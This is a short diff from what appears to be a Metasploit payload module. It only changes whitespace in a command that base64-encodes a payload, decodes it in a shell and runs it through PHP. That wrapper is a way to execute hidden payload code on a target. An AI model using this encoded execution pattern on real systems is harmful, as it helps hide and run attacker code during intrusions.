@@ -33,6 +33,6 @@ module MetasploitModule
   def generate(_opts = {})
     payload = super
 
-    "echo '#{Base64.strict_encode64(payload)}' | base64 -d | exec $( which php)"
+    "echo '#{Base64.strict_encode64(payload)}'|base64 -d|exec $(which php)"
   end
 end
